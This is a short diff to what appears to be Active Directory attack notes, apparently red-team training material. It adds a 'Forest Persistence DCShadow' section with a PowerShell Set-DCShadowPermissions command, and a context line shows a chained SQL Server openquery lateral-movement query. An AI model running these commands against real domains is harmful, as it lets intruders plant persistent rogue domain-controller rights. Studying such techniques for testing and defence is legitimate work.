@@ -699,3 +699,9 @@ select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","sele
 ```
 
 # Forest Persistence DCShadow
+
+**1. Setting the permissions:**
+```powershell
+# Setting the permissions
+Set-DCShadowPermissions -FakeDC corp-user1 -SAMAccountName root1user -Username user1 -Verbose
+```
